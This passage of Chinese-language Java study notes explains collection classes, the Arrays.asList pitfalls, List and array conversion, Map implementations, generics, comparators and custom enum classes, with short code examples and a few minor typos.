Serializable\n```\n因为是底层是数组，所以ArrayList在初始化的时候，有初始大小10（注意：如果创建集合时，没有向集合中任何元素，此时大小为0，添加元素后才变成10），插入新元素的时候，会判断是否需要扩容，扩容的步长是0.5倍原容量，扩容方式是利用数组的复制，因此有一定的开销\n\n\n### List实现类-Vector\n数组结构实现，必须开辟连续空间，查询快，增删慢；运行效率慢， 线程安全； jdk1.0版本加进来\n\n### List实现类-LinkedList\n**双向**链表结构实现，无需开辟连续空间，查询慢，增删快；\n其中也含有ListIterator\n```java\npublic class LinkedList<E>\nextends AbstractSequentialList<E>\nimplements List<E>, Deque<E>, Cloneable, Serializable\n```\n由于LinkedList实现了Deque, 而Deque继承了Queue，所以可以使用LinkedList来实现Queue\n\n## Set子接口\n特点：无序、无下标、元素不可重复\n方法：全部是继承自Collection中的方法，自己没有额外添加方法\n\n### Set实现类，HashSet\n存储过程(判断相等依据)：\n1. 执行hashCode方法计算元素存放位置，如果此位置为空，则直接保存，如果不为空执行第二步\n2. 执行equals方法，如果返回true，则认为是重复，否则，形成链表\n```java\nclass Person{\n  String name;\n  int age;\n\n  public Person(String name, int age){\n    this.name = name;\n    this.age = age;\n  }\n\n  public String toString(){\n    return name+\" \"+age;\n  }\n\n  public int hashCode(){\n    return age;\n  }\n\n  public boolean equals(Object person){\n    if(person instanceof Person)\n      return hashCode() == person.hashCode();\n    return false\n  }\n}\n\npublic static void test8(){\n  HashSet<Person> set = new HashSet();\n\n  set.add(new Person(\"whz\", 12));\n  set.add(new Person(\"hz\", 18));\n  set.add(new Person(\"hxz\", 18));\n\n  System.out.println(\"----\");\n    \n  for(Person person : set){\n    System.out.println(person);\n  }\n}\n```\n输出\n```\nhz 18\nwhz 12\n```\n\n### Set实现类，TreeSet\n- 存储结构：红黑树\n- 基于排列顺序实现元素不重复\n- 实现了SortedSet接口，对集合元素自动排序\n- 元素对象的类型必须实现Comparable接口，指定排序规则。如果compareTo()方法返回值为0，则认为是重复元素\n\n## 集合的toString()\nLinkedList，ArrayList, HashSet, TreeSet等集合都间接地继承了AbstractCollection中的重写了的toString()方法，其源码如下\n```java\npublic String toString() {\n    Iterator<E> it = iterator();\n    if (! it.hasNext())\n        return \"[]\";\n\n    StringBuilder sb = new StringBuilder();\n    sb.append('[');\n    for (;;) {\n        E e = it.next();\n        sb.append(e == this ? \"(this Collection)\" : e);\n        if (! it.hasNext())\n            return sb.append(']').toString();\n        sb.append(',').append(' ');\n    }\n}\n```\n与数组的toString()区别开来\n```java\npublic static void main(String[] args) throws Exception{\n  int[] ar = new int[]{1, 2, 3};\n  System.out.println(ar.toString());// 输出: [I@1eb44e46\n\n  List<Integer> list = new LinkedList();\n  list.add(1);\n  list.add(2);\n  list.add(3);\n  System.out.println(list.toString()); //输出: [1, 2, 3]\n}\n```\n\n## 获取List的方式\n### 常规方式\n这种就是我们平常用的最多最平常的方式了，没什么好说的，后面缺失的泛型类型在 JDK 7 之后就\n可以不用写具体的类型了，改进后会自动推断类型。\n```java\nList<String> languages = new ArrayList<>();\nlanguages.add(\"Java\");\nlanguages.add(\"PHP\");\nlanguages.add(\"Python\");\nSystem.out.println(languages);\n```\n\n### Arrays 工具类\n```java\nimport static java.util.Arrays.asList;\n\nList<String> jdks = asList(\"JDK6\", \"JDK8\", \"JDK10\");\nSystem.out.println(jdks);\n```\n注意，上面的 asList 是 Arrays 的静态方法，这里使用了静态导入。**这种方式添加的是不可变的 List, 即不能添加、删除等操作，需要警惕.**\n如果要可变，那就使用 ArrayList 再包装一下，如下面所示。\n```java\nList<String> numbers = new ArrayList<>(Arrays.asList(\"1\", \"2\", \"3\"));\nnumbers.add(\"4\");\nSystem.out.println(numbers);\n```\n包装一下，这就是可变的 ArrayList 了。\n\n#### Arrays.asList(..)注意点\n**Arrats.asList()返回的集合不能做增删操作，可以做修改操作**\n\n如下代码执行时会抛出了java.lang.UnsupportedOperationException异常\n```java\nString[] icarr = ic.split(\",\");\nList<String> iconlist = Arrays.asList(icarr);\nint len = iconlist.size();\nfor (int b = 0; b < len; b++) {\n  if (icon.equals(ne.get(b))) {\n    iconlist.remove(b);\n    break;\n  }\n}\n```\n异常在 iconlist.remove(b);这一行，当时很奇怪哈，百度了下，发现是由于asList引起的异常，使用asList返回的是Arrays的内部类ArrayList\n```java\n@SafeVarargs\n@SuppressWarnings(\"varargs\")\npublic static <T> List<T> asList(T... a) {\n   return new ArrayList<>(a);\n}\n \n \nprivate static class ArrayList<E> extends AbstractList<E>\n    implements RandomAccess, java.io.Serializable\n{\n    private static final long serialVersionUID = -2764017481108945198L;\n    private final E[] a;\n \n    ArrayList(E[] array) {\n        a = Objects.requireNonNull(array);\n    }\n```\n**她继承的是父类AbstractList里面的add和remove方法只是抛出异常**\n```java\npublic void add(int index, E element) {\n        throw new UnsupportedOperationException();\n    }\n \npublic E remove(int index) {\n        throw new UnsupportedOperationException();\n    }\n```\n而java.util.ArrayList是这样的\n```java\npublic class ArrayList<E> extends AbstractList<E>\n        implements List<E>, RandomAccess, Cloneable, java.io.Serializable\n{\n    private static final long serialVersionUID = 8683452581122892189L;\n    private static final int DEFAULT_CAPACITY = 10;\n    private static final Object[] EMPTY_ELEMENTDATA = {};\n    private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {};\n```\n他重写了父类的add和remove方法\n```java\npublic boolean add(E e) {\n        ensureCapacityInternal(size + 1);  // Increments modCount!!\n        elementData[size++] = e;\n        return true;\n    }\n \npublic E remove(int index) {\n        rangeCheck(index);\n \n        modCount++;\n        E oldValue = elementData(index);\n \n        int numMoved = size - index - 1;\n        if (numMoved > 0)\n            System.arraycopy(elementData, index+1, elementData, index,\n                             numMoved);\n        elementData[--size] = null; // clear to let GC do its work\n \n        return oldValue;\n    }\n```\n所以原因就在于，使用asList方法继承的父类的add和remove，只会抛出UnsupportedOperationException异常，java.util.ArrayList重写了父类的add和remove\n\n**解决方法**\n```java\nString[] icarr = ico.split(\",\");\nList<String> iconlist = new ArrayList<>(Arrays.asList(icarr));\n```\n\n\n### Collections 工具类\n```java\nList<String> apples = Collections.nCopies(3, \"apple\");\nSystem.out.println(apples);\n```\n**这种方式添加的是不可变的、复制某个元素N遍的工具类**，以上程序输出：[apple, apple, apple]\n老规则，如果要可变，使用 ArrayList 包装一遍。\n```java\nList<String> dogs = new ArrayList<>(Collections.nCopies(3, \"dog\"));\ndogs.add(\"dog\");\nSystem.out.println(dogs);\n```\n还有初始化单个对象的 List 工具类，这种方式也是不可变的，集合内只能有一个元素，\n这种也用得很少啊。\n```java\nList<String> cat = Collections.singletonList(\"cat\");\nSystem.out.println(cat);\n```\n还有一个创建空 List 的工具类，没有默认容量，节省空间，但不知道实际工作中有什么鸟用。\n```java\nList<String> cat = Collections.emptyList(\"cat\");\n```\n\n### 匿名内部类\n```java\nList<String> names = new ArrayList<>() {{\n    add(\"Tom\");\n    add(\"Sally\");\n    add(\"John\");\n}};\n\nSystem.out.println(names);\n```\n\n### JDK8 Stream\n```java\nimport  java.util.stream.Collectors;\n\nList<String> colors = Stream.of(\"1\", \"4\", \"2\").collect(Collectors.toList());\nSystem.out.println(colors);\n```\nStream 是 JDK 8 推出来的新概念，比集合还要更强大，还可以和集合互相转换。\n\n### JDK 9 List.of\n```java\nList<String> cups = List.of(\"A\", \"B\", \"C\");\nSystem.out.println(cups);\n```\n这是 JDK 9 里面新增的 List 接口里面的静态方法，同样也是不可变的。\n\n## List和数组相互转换方法\n### List转数组\n#### 方法一、使用for循环\n```java\n//要转换的list集合\nList testList = new ArrayList(){{add(“aa”);add(“bb”);add(“cc”);}};\n\n//初始化需要得到的数组\nString[] array = new String[testList.size()];\n\n//使用for循环得到数组\nfor(int i = 0; i < testList.size();i++){\n    array[i] = testList.get(i);\n}\n\n//打印数组\nfor(int i = 0; i < array.length; i++){\n    System.out.println(array[i]);\n}\n```\n\n#### 方法二、使用toArray()方法\n需要特别注意，不能这样写：\n```java\nArrayList<String> list=new ArrayList<String>();\nString strings[]=(String [])list.toArray();\n```\n这样写编译没有什么问题，但是运行时会报ClassCastException，这是因为Java中允许向上和向下转型，但是这个转型是否成功是根据Java虚拟机中这个对象的类型来实现的。Java虚拟机中保存了每个对象的类型。而数组也是一个对象。数组的类型是java.lang.Object。把java.lang.Object转换成java.lang.String是显然不可能的事情，因为这里是一个向下转型，而虚拟机只保存了这是一个Object的数组，不能保证数组中的元素是String的，所以这个转型不能成功。数组里面的元素只是元素的引用，不是存储的具体元素，所以数组中元素的类型还是保存在Java虚拟机中的。\n\n因此正确的方法是这样的：\n```java\n//要转换的list集合\nList<String> testList = new ArrayList<String>(){{add(\"aa\");add(\"bb\");add(\"cc\");}};\n\n//使用toArray(T[] a)方法\nString[] array2 = testList.toArray(new String[testList.size()]);\n\n//打印该数组\nfor(int i = 0; i < array2.length; i++){\n    System.out.println(array2[i]);\n}\n```\n\n### 数组转List\n#### 方法一：使用for循环\n```java\n//需要转换的数组\nString[] arrays = new String[]{\"aa\",\"bb\",\"cc\"};\n\n//初始化list\nList<String> list = new ArrayList<String>();\n\n//使用for循环转换为list\nfor(String str : arrays){\n   list.add(str);\n}\n\n//打印得到的list\nSystem.out.println(list);\n```\n\n#### 方法二：使用asList（）\n```java\nArrayList<String> arrayList = new ArrayList<String>(Arrays.asList(arrays));\n```\n\n#### 方法三：使用asList（）\n```java\nList<String> list = Arrays.asList(arrays);\n```\n\n同方法二一样使用了asList()方法。这不是最好的，因为asList()返回的列表的大小是固定的。事实上，返回的列表不是java.util.ArrayList，而是定义在java.util.Arrays中一个私有静态类。我们知道ArrayList的实现本质上是一个数组，而asList()返回的列表是由原始数组支持的固定大小的列表。这种情况下，如果添加或删除列表中的元素，程序会抛出异常UnsupportedOperationException。\n\n推荐使用方法二\n\n> 注意：Arrays.asList的方法参数时泛型，所以传入基本类型数组时，一定要注意。例如现在有一个变量`int[] a`，那么`Arrays.asList(a)`的返回值是`List<int[]>`。如果想要将基本类型数组转成对应的引用类型数组的话，可以使用Arrays.stream()。具体使用方法见方法四\n\n#### 方法四：使用Arrays.stream()\n这个方法可以将基本类型数组转成对应的引用类型数组\n\n```java\n// int=>Integer\nList<Integer> list = Arrays.stream(a).boxed().collect(Collectors.toList());\n\n// long=>Long\nList<Long> list = Arrays.stream(b).boxed().collect(Collectors.toList());\n\n// double=>Double\nList<Double> list = Arrays.stream(c).boxed().collect(Collectors.toList());\n```\n\n> 注意：这个方法只支持int, long, double三种类型，其他基本类型不行\n\n\n#### 方法五：使用Collections.addAll()\n```java\nList<String> list2 = new ArrayList<String>(arrays.length);\nCollections.addAll(list2, arrays);\n```\n\n# Map集合体系\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220510141227.png)\n\n## Map父接口\n特点：存储一对数据（Key-Value），无序、无下标，键不可重复，值可重复。\n方法：\n- `V put(K key, V value)`:将对象存入到集合中，关联键值。key重复则覆盖原值。\n- `Object get(Object key)`:根据键获取对应的值。\n- `Collection<V> values()`: 返回包含所有值的Collection集合。\n- `Set<Map.Entry<K,V>> entrySet()` :的返回值也是返回一个Set集合，此集合的类型为Map.Entry。\n- `Set<K> keySet()`:返回值是Map中key值的集合\n\nMap.Entry是Map声明的一个内部接口，此接口为泛型，定义为`Entry<K,V>`。它表示Map中的一个实体（一个key-value对）\n\n遍历Map的方式：\n```java\npublic static void main(String[] args) throws Exception{\n  Map<String, String> map = new HashMap<String, String>();\n  map.put(\"key1\", \"value1\");\n  map.put(\"key2\", \"value2\");\n  map.put(\"key3\", \"value3\");\n  map.put(\"key3\", \"value3\");\n\n  //通过Map.keySet遍历key和value：\n  for(String key : map.keySet()){\n    System.out.println(\"key=\" + key + \" and value=\" + map.get(key));\n  }\n\n  //通过Map.entrySet遍历key和value\n  Set<Map.Entry<String, String>> entrySet = map.entrySet();\n  for(Map.Entry<String, String> entry : entrySet){\n    System.out.println(\"key=\" + entry.getKey() + \" and value=\" + entry.getValue());\n  }\n\n  //通过Map.values()遍历所有的value，但不能遍历key\n  for(String v : map.values()){\n    System.out.println(\"key=\"+v );\n  }\n}\n```\n\n## Map实现类：HashMap\njdk1.2版本，线程不安全，运行效率快，允许null作为key或是value\n\n- HashMap刚创建时，table是nu11，为了节省空间，当添加第一个素是，table容量调整为16\n- 当元素个数大于阈值`（16*0.75=12）`时，会进行扩容，扩容后大小为原来的2倍。目的是减少调整元素的个数。\n- jdk1.8当每个链表长度大于8，并且元素个数大于等于64时，会调整为红黑树，目的提高执行效率\n- jdk1.8当链表长度小于6时，调整成链表\n- jdk1.8以前，链表时头插入，jdk1.8以后时是尾插入\n\n## Map实现类：Hashtable\njdk1.0版本，线程安全，运行效率慢，不允许null作为key或是value\n\n## Map实现类：Properties\nHashtable的子类，要求key和value都是String。通常用于属性配置文件的读取\n存取数据时，建议使用setProperty(String key, String value)方法和getProperty(String key)方法\n```java\nProperties pros = new Properties();\npros.load(new FileInputStream(\"jdbc.properties\"));\nString user = pros.getProperty(\"user\");\nSystem.out.println(user);\n```\n\n## Map实现类：TreeMap\n实现了SortedMap接口(是Map的子接口)，可以对key自动排序\n\n## 判重\nHashMap中判断key是否重复的方法与HashSet判重方法一样，且解决hash冲突的方式都是链地址法\nTreeSet中判断key是否重复的方法与TreeSet判重方法一样\n\n\n## LinkedHashMap\nLinkedHashMap 是HashMap的一个子类，**保存了记录的插入顺序**，在用Iterator遍历LinkedHashMap时，先得到的记录肯定是先插入的.也可以在构造时用带参数，按照应用次数排序。在遍历的时候会比HashMap慢，不过有种情况例外，当HashMap容量很大，实际数据较少时，遍历起来可能会比 LinkedHashMap慢，因为LinkedHashMap的遍历速度只和实际数据有关，和容量无关，而HashMap的遍历速度和他的容量有关。\n\n# Collections工具类\n概念：集合工具类，定义了除了存取以外的集合常用方法。\n方法：\n- `public static void reverse(List<?> list)`//反转集合中元素的顺序\n- `public static void shuffle(List<?>list)`//随机重置集合元素的顺序\n- `public static void sort(List\\<T>list)`//升序排序（元素类型必须实现Comparable接口）\n- `public static \\<T> void copy(List<? super T> dest, List<? extends T> src)` //将集合sc复制到dest中\n\n[详情](https://docs.oracle.com/javase/7/docs/api/java/util/Collections.html)\n\n# 泛型\nJava泛型是JDK1.5中引入的一个新特性，其本质是参数化类型，把类型作为参数传递。\n常见形式有泛型类、泛型接口、泛型方法。\n- 语法：\n`<T,..>`称为类型占位符。表示一种引用类型。如果编写多个，使用逗号隔开\n- 好处：\n  - 提高代码的重用性\n  - 防止类型转换异常，提高代码的安全性\n\n## 泛型的类型可以为数组\n**由于泛型表示的是引用类型**，而数组也是引用类型，所以泛型可以为数组\n\n```java\nclass Student<T>{\n  ArrayList<T> list = new ArrayList();\n  public void add(T a){\n    list.add(a);\n  }\n}\npublic class Te {\n  public static void main(String[] args) {\n    Student<int[]> st = new Student();\n    st.add(new int[]{1,2});\n    System.out.println(st.list.toString()); //输出：[[I@6504e3b2]\n  }\n}\n```\n```java\npublic static int[][] get(){\n  ArrayList<int[]> list = new ArrayList();\n  list.add(new int[]{1,2});\n  list.add(new int[]{2});\n  Integer[] arr;\n  return list.toArray(new int[list.size()][]); \n}\n```\n\n## 没有指定泛型类型时\n注：new泛型类，或实现泛型接口时，如果没有指定泛型，则泛型类或泛型接口中的泛型类型默认为Object\n例如，如果没有指定泛型的话，则ArrayList可以添加任意类型的元素，并且默认所有类型都是Object\n```java\npublic static void test10(){\n  ArrayList list = new ArrayList();\n  list.add(1);\n  list.add(\"fff\");\n  list.add(true);\n  System.out.println(list); //输出：[1, ff, true]\n}\n```\n\n又例如:\n```java\npublic static void main(String[] args){\n  List<Integer> list = Arrays.asList(new Integer[]{1,3,5,2,6,3});\n  Collections.sort(list, new Comparator(){\n    public int compare(Object a, Object b){\n      return (Integer)a < (Integer)b ? 1 : -1;\n    }\n  });\n  System.out.println(list);\n}\n```\n此代码为正确写法\n由于没有指定Comparator的泛型，所以其抽象方法`int compare(T o1, T o2)`会变成`int compare(Object o1, Object o2)`，所以在没有指定Comparator的泛型的情况下实现compare方法时，写成`int compare(Integer o1, Integer o2)`, 则会报我们没有实现接口的抽象方法的错误。\n如果指定Comparator的泛型为Integer，则其抽象方法`int compare(T o1, T o2)`会变成`int compare(Integer o1, Integer o2)`\n\n\n```java\npublic static void test10(){\n  ArrayList list = new ArrayList();\n  list.add(new Person(\"whz\", 12));\n\n  System.out.println(((Person)list.get(0)).getAge()); //输出12\n\n  System.out.println(list.get(0).getAge()); //报Object类型没有getAge()方法错误\n}\n```\n\n\n<font color=\"red\">虽然没有指定泛型类型与指定泛型为Object的底层效果一样，但是在编译器看来，这是不一样的；不同点如下：</font>\n\n- 一个没有指定泛型类型的变量赋值与另一个指定了泛型类型的变量之间可以相互赋值\n- 两个都指定了泛型类型且泛型类型不同的变量之间是不同相互赋值的\n```java\nList a = new ArrayList();\nList<Integer> b = a;//编译通过\n\nArrayList<String> d = (ArrayList<String>)List.of(\"aaa\", \"bbb\"); // 编译通过\n\nList<Integer> c = new ArrayList();\nList<Object> d = c;//编译不通过error: incompatible types: List<Integer> cannot be converted to List<Object>\n```\n\n### 声明泛型类/接口时，加<类名>与不加<类名>\n**情况一：**\n```java\nList a = new ArrayList<String>();\na.add(\"jfdkf\");\na.add(\"jfdkjf\");\na.add(11);\n```\n`List a = new ArrayList<String>()`：会现在堆中生成一个泛型类型为String的ArrayList对象，然后赋给一个泛型类型为Object的引用变量a；所以a变量的泛型类型还是Object\n\n**情况二：**\n```java\nList<String> a = new ArrayList();\na.add(\"jfdkf\");\na.add(\"jfdkjf\");\na.add(11);// error: incompatible types: int cannot be converted to String\n```\n`List<String> a = new ArrayList();`会先在堆中生成一个泛型类型为Object的ArrayList对象，然后赋给一个泛型类型为String的引用变量a；所以a变量的泛型类型为String\n\n**实战**\n以ArrayList中的`ArrayList(Collection<? extends E> c)`为例：\n```java\nList<String> a = new ArrayList();\na.add(\"aaa\");\nList<Integer> b = new ArrayList(a);\n```\n`List<Integer> b = new ArrayList(a);`: 因为`new ArrayList(a)`中ArrayList类的泛型类型为Object，即构造参数中`ArrayList(Collection<? extends E> c)`中的`E`为Object，所以a集合中的泛型类型符合`? extends E`，所以能创建一个ArrayList对象，然后将引用赋给泛型类型为Integer的引用变量b\n。如果是`List<Integer> b = ne ArrayList<Integer>(a)`：则编译就不会通过了\n\n\n## 泛型类\n语法： 类名\\<T,...>\n```java\npublic class MyGeneric<T>{\n  // 注: 泛型是不能new的， 即不能写成 T t = new T();\n  T t;\n\n  public void show(T t){\n    System.out.println(t);\n  }\n  public T getT(){\n    return t;\n  }\n}\n```\n```java\npublic class TestGeneric{\n  public static void main(String[] args){\n    MyGeneric<String> myGeneric = new MyGeneric<String>;\n    myGeneric.t =  \"hello\";\n    myGeneric.show(\"jfkdjfkd\")\n    String string = myGeneric.getT();\n  }\n}\n```\n\n## 泛型接口\n语法: 接口名\\<T,...>\n```java\npublic interface MyInterface<T>{\n  String name = \"zhangsan\";\n\n  T server(T t);\n}\n```\n实现泛型接口的两种方式：\n1. \n```java\npublic class MyInterfaceImpl implements MyInterface<String>{\n  @Override\n  public String server(String t){\n    System.out.println(t);\n    return t;\n  }\n} \n```\n2. \n```java\npublic class MyInterfaceImpl<T> implements MyInterface<T>{\n  @Override\n  public T server(T t){\n    System.out.println(t);\n    return t;\n  }\n} \n```\n\n## 泛型方法\n语法：`[访问修饰符] [static] <T> [void|T|类名] 方法名(参数)`\n\n泛型方法与泛型类或泛型接口可以分开使用，即泛型方法不一定是位于泛型类中的。\n\n以下两种情况中，泛型方法中的泛型类型是根据调用泛型方法时传入的参数确定的\n- 泛型方法不是位于泛型类/接口\n- 泛型方法位于泛型类/接口中，且泛型方法中的泛型符号与泛型类/接口中的泛型符号不同\n\n当泛型方法是位于泛型类/接口中，且泛型方法中的泛型符号与泛型类/接口中的泛型符号相同时，则泛型方法中的泛型类型与泛型类/接口中的泛型类型相同\n\n所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），该类型参数声明部分在方法返回类型之前，方法修饰符之后\n```java\npublic class MyGenericMethod{\n  public <T> T show(T t){\n    System.out.println(t);\n    return t;\n  }\n}\n```\n```java\nstatic <T> void fromArrayToCollection(T[] a, Collection<T> c) {\n    for (T o : a) {\n        c.add(o); // Correct\n    }\n}\n```\n```java\ninterface Collection<E> {\n    public <T> boolean containsAll(Collection<T> c);\n    public <T extends E> boolean addAll(Collection<T> c);\n    // Hey, type variables can have bounds too!\n}\n```\n```java\npublic class TestGeneric{\n  public static void main(String[] args){\n    MyGenericMethod myGeneric = new MyGenericMethod();\n    myGeneric.show(\"jfdkfjk\"); \n    myGeneric.show(111); \n  }\n}\n```\n\n## 泛型通配符\n当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符<?>表示\n```java\nclass Parent{}\n\nclass Son extends Parent{}\n\nclass BoxUtils{\n\tpublic static void setBox(Box<Parent> box){\n\t\tSystem.out.println(box);\n\t}\n}\n\npublic static void main(String[] args){\n\tBox<Parent> box = new Box<Parent>();\n\tBoxUtils.setBox(box);\n\n\tBox<Son> box1 = new Box<Son>();\n\tBoxUtils.setBox(box1); //编译时候出错\n}\n```\n\n使用泛型通配符解决上述问题\n```java\nclass BoxUtils{\n\tpublic static void setBox(Box<?> box){\n\t\tSystem.out.println(box);\n\t}\n}\npublic static void main(String[] args){\n\tBox<Son> box1 = new Box<Son>();\n\tBoxUtils.setBox(box1); \n}\n```\n\n### 泛型上下限\nJAVA的泛型中可以指定一个泛型的上限和下限\n- 泛型的上限：\n格式：类型名称<? extends 类>对象名称\n意义：只能接收该类型及其子类\n- 泛型的下限：\n格式：类型名称<? super 类>对象名称\n意义：只能接收该类型及其父类\n\n注：泛型上下限是用于使用泛型类/接口/方法时，而不能用于创建泛型类/接口/方法。\n\n### 调用泛型中的方法\n```java\nclass Person<T> {\n  public void show(T t) {\n    t.show();\n  }\n}\nclass Worker {\n  public void show() {\n    System.out.println(\"get worker\");\n  }\n}\n```\n光是`Person<T>`这个泛型类型的声明就无法编译通过。就不用说实例化`Person<Worker>`的地方了。为啥呢？因为`Person<T>`这个声明的意思实际上是：有一个泛型参数T，它可以被实例化为任意java.lang.Object的子类。实际上跟下面这个声明是等价的：\n```java\nclass Person<T extends Object> {\n  public void show(T t) {\n    t.show(); // doesn't compile\n  }\n}\n```\n于是在`Person<T>`类型声明内，T类型可用的部分只有“java.lang.Object”这个上限类型所拥有的信息，也就是说调用`t.toString()`、`t.hashCode()`、`t.getClass()`之类的Object上有的方法都OK，但是调用`t.show()`则不行——因为作为T参数上限的Object类型没有show()方法。于是编译`Person<T>`这个类型声明的时候，类型检查就通不过，直接就失败了。要让这个例子能通过要怎么做呢？改变泛型参数T的类型信息即可。\n例如说使它的上限变为更加具体的类型：\n```java\ninterface IShowable {\n  void show();\n}\n\nclass Person<T extends IShowable> {\n  public void show(T t) {\n    t.show();\n  }\n}\n\nclass Worker implements IShowable {\n  public void show() {\n    System.out.println(\"get worker\");\n  }\n}\n```\n这样在`Person<T>`这个泛型类型的声明中，泛型参数T就带有了足够的类型信息来表明它必须实现IShowable接口，于是T就可以使用`IShowable.show()`方法了。\n\n**注意点**\n```java\npublic class Main1{\n  public static void main(String[] args){\n    Student st = new Student(); \n    test(st); \n  }\n\n  public static <T extends Person> void test(T t){\n    System.out.println(t.age);  // 输出2\n    //System.out.println(t.id); //编译报错\n  }\n}\n\nclass Person{\n  public int age = 2;\n}\n\nclass Student extends Person{\n  public int id = 1;\n}\n```\n\n使用`<T extends Person>`，则编译时，T就只能使用Person中的属性与方法，这是因为在编译时，编译器无法知道有哪些类是继承了Person， 所以不能使用Person子类中的属性与方法，否则会报错\n\n## 泛型擦除\n所谓泛型，就是指在定义一个类、接口或者方法时可以指定类型参数。这个类型参数我们可以在使用类、接口或者方法时动态指定。\n\n使用泛型可以给我们带来如下的好处：\n- 编译时类型检查：当我们使用泛型时，加入向容器中存入非特定对象在编译阶段就会报错。假如不使用泛型，可以向容器中存入任意类型，容易出现类型转换异常。\n- 不需要进行类型强制转换：使用泛型后容器可以记住存入容器中的对象的类型；\n- 代码可读性提升：使用泛型后开发人员看一眼就知道容器中存放的是何种对象。\n\n有了上面的泛型擦除知识后，我们就可以理解下面的现象了：\n\n1. 泛型类的class对象相同\n```java\npublic static void main(String[] args) {  \n    List<String> ls = new ArrayList<String>();  \n    List<Integer> li = new ArrayList<Integer>();  \n    System.out.println(ls.getClass() == li.getClass());  \n}  \n```\n\n2. 不能对泛型数组进行初始化\n```java\nList<String>[] list = new List<String>[];  \n```\n\n3. instanceof 不允许存在泛型参数\n```java\nList<String> list = new ArrayList<String>();  \n//在运行时list的泛型参数会被删除，所以判断不了类型\nSystem.out.println(list instanceof List<String>)\n```\n\n# 比较器\n在java中经常会涉及到对象数组的排序问题，那么就涉及到对象之间的比较问题\njava实现对象排序的方式有两种：\n- 自然排序：`java.lang.Comparable<T>`\n- 定制排序：`java.util.Comparator<T>`\n\n**Comparable与Comparator都是函数式接口**\n\n## 自然排序：Comparable\n- Comparable接口强行对实现它的每个类的对象进行整体排序，这种排序被称为类的自然排序\n- 实现Comparable接口的类必须要实现compareTo(Object obj)方法。对于执行`e1.compareTo(e2)`,有下面三种情况\n  - 如果这个方法返回正整数，表示e1对象大于e2对象；\n  - 如果这个方法返回0，表示e1对象等于e2对象；\n  - 如果这个方法返回负整数，表示e1对象小于e2对象；\n- 实现Comparable接口的对象列表(和数组)可以同通过Collections.sort或Arrays.sort进行自动排序。实现此接口的对象可以用作有序映射中的键或有序集合中的元素，无需指定比较器\n- 对于类C的每一个e1和e2来说，当且仅当e1.compareTo(e2)==0与e1.equals(e2)具有相同的boolean值时，类C的自然排序才叫做与equals一致。建议(虽然不是必须的)最好使自然排序与equals一致\n```java\nclass Person implements Comparable<Person>{\n    String name; \n    int age;\n    @Override\n     public int compareTo(Person person) {\n          return name.compareTo(person.name);\n          //return this.name - person.name;\n     }\n}\nArrayList<Person> list = new ArrayList<Person>();\n// 添加对象到ArrayList中\nlist.add(new Person(\"aaa\", 10));\nlist.add(new Person(\"bbb\", 20));\nlist.add(new Person(\"ccc\", 30));\nlist.add(new Person(\"ddd\", 40));\nCollections.sort(list); //这里会自动调用Person中重写的compareTo方法。\n```\n\n## 定制排序：Comparator\n- 当元素的类型没有实现java.lang.Comparable接口而又不方便修改代码，或者实现了java.lang.Comparable接口的排序规则不适合当前的操作，那么可以考虑使用Comparator的对象来排序，强行对多个对象进行整体排序的比较\n- 重写compare(Object o1, Object o2)方法，比较o1和o2的大小, 有三种情况：\n  - 如果方法返回正整数，则表示o1大于o2;\n  - 如果返回0，表示相等；\n  - 返回负整数，表示o1小于o2\n- 可以将Comparator传递给sort方法(如Collections.sort或Arrays.sort), 从而允许在排序顺序上实现精确控制\n- 还可以使用Comparator来控制某些数据结构(如有序set或有序映射)的顺序，或者为那些没有自然顺序的对象collection提供排序\n```java\npublic class ComparatorDemo {\n    public static void main(String[] args) {\n        List<Person> people = Arrays.asList(\n                new Person(\"Joe\", 24),\n                new Person(\"Pete\", 18),\n                new Person(\"Chris\", 21)\n        );\n\n        //第一种方式\n        Collections.sort(people, new LexicographicComparator());\n        System.out.println(people);\n        //[{name=Chris, age=21}, {name=Joe, age=24}, {name=Pete, age=18}]\n\n\n        //第二种方式\n        Collections.sort(people, new Comparator<Person>() {\n            @Override\n            public int compare(Person a, Person b) {\n                // TODO Auto-generated method stub\n                 return a.age < b.age ? -1 : a.age == b.age ? 0 : 1;\n            }\n        });\n        System.out.println(people);\n        //[{name=Pete, age=18}, {name=Chris, age=21}, {name=Joe, age=24}]\n    }\n}\nclass LexicographicComparator implements Comparator<Person> {\n    @Override\n    public int compare(Person a, Person b) {\n        return a.name.compareToIgnoreCase(b.name);\n    }\n}\nclass Person {\n    String name;\n    int age;\n    Person(String n, int a) {\n        name = n;\n        age = a;\n    }\n    @Override\n    public String toString() {\n        return String.format(\"{name=%s, age=%d}\", name, age);\n    }\n}\n```\n\n## 比较器比较原理\n要比较两个元素A与B的大小，会调用compare(A, B)或A.compareTo(B)方法，返回为正数表明A大; 返回负数表明B大；返回0表明一样大\n\n例如实现降序排序\n```java\npublic static void main(String[] args){\n  List<Integer> list = Arrays.asList(new Integer[]{1,3,5,2,6});\n  Collections.sort(list, (a, b) -> a < b ? 1 : -1);\n  System.out.println(list);\n}\n```\n\n\n# 枚举类\n枚举是一个被命名的整型常数的集合，枚举在日常生活中很常见，例如表示星期的SUNDAY、MONDAY、TUESDAY、WEDNESDAY、THURSDAY、FRIDAY、SATURDAY就是一个枚举。通俗来说，枚举就是一个对象的所有可能取值的集合\n\n- 枚举类的实现\n  - JDK1.5之前需要自定义枚举类\n  - JDK 1.5 新增的 enum 关键字用于定义枚举类\n\n- 若枚举只有一个对象, 则可以作为一种单例模式的实现方式。\n\n- 枚举类的属性\n  - 枚举类对象的属性不应允许被改动, 所以应该使用 private final 修饰\n  - 枚举类的使用 private final 修饰的属性应该在构造器中为其赋值\n  - 若枚举类显式的定义了带参数的构造器, 则在列出枚举值时也必须对应的传入参数\n\n- 自定义枚举类\n  - <font color=\"red\">私有化类的构造器，保证不能在类的外部创建其对象</font>\n  - 在类的内部创建枚举类的实例。声明为：public static final \n  - 对象如果有实例变量，应该声明为private final，并在构造器中初始化\n```java\nclass Season{\n    private final String SEASONNAME;//季节的名称\n    private final String SEASONDESC;//季节的描述\n    private Season(String seasonName,String seasonDesc){\n        this.SEASONNAME = seasonName;\n        this.SEASONDESC = seasonDesc;\n    }\n    \n    //枚举类实例\n    public static final Season SPRING = new Season(\"春天\", \"春暖花开\");\n    public static final Season SUMMER = new Season(\"夏天\", \"夏日炎炎\");\n    public static final Season AUTUMN = new Season(\"秋天\", \"秋高气爽\");\n    public static final 